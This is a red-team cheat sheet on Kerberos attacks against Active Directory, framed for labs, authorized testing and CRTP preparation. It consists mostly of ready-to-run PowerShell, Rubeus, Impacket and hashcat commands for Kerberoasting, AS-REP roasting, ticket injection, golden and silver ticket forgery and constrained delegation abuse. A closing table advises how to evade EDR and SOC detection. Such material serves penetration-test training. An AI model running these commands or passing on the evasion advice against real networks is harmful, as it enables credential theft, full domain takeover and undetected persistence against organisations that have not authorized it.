# 🎟️ Kerberos Attacks (Advanced Red Team )

> **For lab environments, authorized penetration testing, and CRTP preparation only.**
> 
> _Focus: OPSEC, Native API (LotL), Encryption Bypasses, and Active Directory Abuse._

---

## 1. Kerberoasting (TGS-REQ Extraction)

_Goal: Request TGS tickets for SPN-enabled accounts and crack them offline. Emphasize native methods or AES-bypasses to evade EDR._

PowerShell

```
# [Native LotL] Stealth enumeration using PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# [Native LotL] Request TGS into memory using pure .NET (No Rubeus = No AV signature)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.local:1433"

# [Rubeus] Targeted extraction (High OPSEC - Do NOT roast all users at once)
.\Rubeus.exe kerberoast /user:svcSQL /nowrap /outfile:hashes.txt

# [Rubeus] Force RC4 downgrade for easier cracking (Warning: Highly detectable!)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes.txt
```

**Offline Cracking:**

Bash

```
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule --force
```

---

## 2. AS-REP Roasting

_Goal: Request an AS-REP ticket for accounts with `Do not require Kerberos preauthentication` enabled. Requires zero initial privileges—just network access._

PowerShell

```
# [Native LotL] Find vulnerable accounts via PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# [Rubeus] Extract AS-REP hash
.\Rubeus.exe asreproast /user:TargetUser /nowrap /outfile:asrep_hashes.txt

# [Impacket] Remote extraction without domain membership
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

**Offline Cracking:**

Bash

```
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

---

## 3. Pass-the-Ticket (PTT) & Ticket Management

_Goal: Inject a stolen or forged Kerberos ticket into the current LUID (Logon Session) to impersonate another user without touching the disk._

PowerShell

```
# View current tickets in memory
klist

# Purge current tickets (Clean up before injecting to avoid conflicts)
klist purge

# Inject a ticket directly into the current session via Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET_STRING

# Dump existing tickets from LSASS (Requires High Privileges)
.\Rubeus.exe dump /service:krbtgt /nowrap
```

---

## 4. Golden Ticket (TGT Forgery & Forest Trust Abuse)

_Goal: Forge a TGT using the compromised `krbtgt` hash for complete, persistent domain dominance._

> **OPSEC Rule:** Always use AES-256 instead of RC4 if possible. RC4 Golden Tickets trigger immediate alerts in modern SOCs.

PowerShell

```
# Forge AES-256 Golden Ticket and inject into memory
.\Rubeus.exe golden /aes256:KRBTGT_AES_KEY /domain:domain.local /sid:DOMAIN_SID /user:Administrator /ptt

# [Forest Compromise] Golden Ticket with SID History (Child-to-Parent Trust Abuse)
# Adds the Enterprise Admins SID to the ExtraSids property
.\Rubeus.exe golden /aes256:CHILD_KRBTGT_AES /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_ENTERPRISE_ADMIN_SID /user:Administrator /ptt
```

---

## 5. Silver Ticket (TGS Forgery)

_Goal: Forge a TGS for a specific service using the compromised machine or service account hash. Does not require DC communication._

PowerShell

```
# Forge AES-256 Silver Ticket for the CIFS service (File Share / WMI / PSRemoting access)
.\Rubeus.exe silver /aes256:SERVICE_AES_KEY /domain:domain.local /sid:DOMAIN_SID /user:Administrator /service:cifs/target.domain.local /ptt

# Note: Common target services include cifs (Files/SMB), host (Scheduled Tasks), wmi (WMI Execution), and http (WinRM).
```

---

## 6. Constrained Delegation (S4U2Self & S4U2Proxy)

_Goal: Abuse an account with Constrained Delegation to impersonate ANY user to the allowed service._

PowerShell

```
# Step 1: Request a TGT for the service account you control
.\Rubeus.exe asktgt /user:websvc /aes256:AES_KEY /outfile:tgt.kirbi

# Step 2: Use the TGT to impersonate Domain Admin to the allowed target service
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🛡️ OPSEC Notes & Telemetry Matrix

|**Attack**|**Detection Risk**|**Event IDs & Telemetry**|**OPSEC Mitigation**|
|---|---|---|---|
|**Kerberoast (All)**|**High**|Event 4769 (Multiple TGS Requests).|Target specific users. Use native .NET classes instead of Rubeus.|
|**Kerberoast (RC4)**|**High**|Event 4769 with Ticket Encryption Type `0x17` (RC4).|Modern AD uses AES. Forcing RC4 stands out immediately.|
|**AS-REP Roast**|**Medium**|Event 4768 (TGT Request without pre-auth).|Inherently noisy, but often blends with misconfigured legacy apps.|
|**Golden Ticket (RC4)**|**Critical**|Missing TGS-REQ (4769) prior to logon. RC4 encryption.|Use AES-256. Align ticket lifetime to default 10 hours (not 10 years).|
|**Silver Ticket**|**Low**|No Domain Controller logs generated.|Traffic only flows between attacker and target machine. Highly stealthy.|

---

_Created for Active Directory Red Teaming Operations._